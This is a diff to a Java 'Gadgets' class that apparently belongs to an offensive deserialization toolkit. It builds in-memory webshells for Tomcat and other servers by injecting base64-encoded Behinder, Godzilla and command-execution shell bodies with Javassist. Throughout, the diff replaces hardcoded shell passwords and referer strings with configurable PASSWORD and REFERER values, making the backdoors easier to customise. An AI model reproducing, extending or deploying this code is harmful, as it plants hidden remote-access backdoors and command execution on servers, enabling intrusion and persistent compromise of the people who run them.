@@ -424,31 +424,33 @@ public class Gadgets {
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_FIELD_VALUE), ctClass));
 
 				if (isTomcat) {
-					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL_FOR_TOMCAT));
+					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL_FOR_TOMCAT)
+							.replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
 				} else {
-					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL));
+					insertMethod(ctClass, method, Utils.base64Decode(BEHINDER_SHELL)
+							.replace("f359740bd1cda994", PASSWORD).replace("https://su18.org/", REFERER));
 				}
 				break;
 			// 哥斯拉类型的内存马
 			case "gz":
 				insertField(ctClass, "payload", "Class payload ;");
-				insertField(ctClass, "xc", "String xc = \"7ff9fe91aaa7d3aa\";");
+				insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
 
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(MD5), ctClass));
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
 
-				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL));
+				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_SHELL).replace("https://su18.org/", REFERER));
 				break;
 			// 哥斯拉 raw 类型的内存马
 			case "gzraw":
 				insertField(ctClass, "payload", "Class payload ;");
-				insertField(ctClass, "xc", "String xc = \"7ff9fe91aaa7d3aa\";");
+				insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
 
 				ctClass.addMethod(CtMethod.make(Utils.base64Decode(AES_FOR_GODZILLA), ctClass));
 
-				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL));
+				insertMethod(ctClass, method, Utils.base64Decode(GODZILLA_RAW_SHELL).replace("https://su18.org/", REFERER));
 				break;
 			// Tomcat Executor cmd 执行内存马
 			case "execute":
@@ -476,9 +478,9 @@ public class Gadgets {
 				insertCMD(ctClass);
 
 				if (isTomcat) {
-					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT));
+					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL_FOR_TOMCAT).replace("https://su18.org/", REFERER));
 				} else {
-					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL));
+					insertMethod(ctClass, method, Utils.base64Decode(CMD_SHELL).replace("https://su18.org/", REFERER));
 				}
 
 				break;
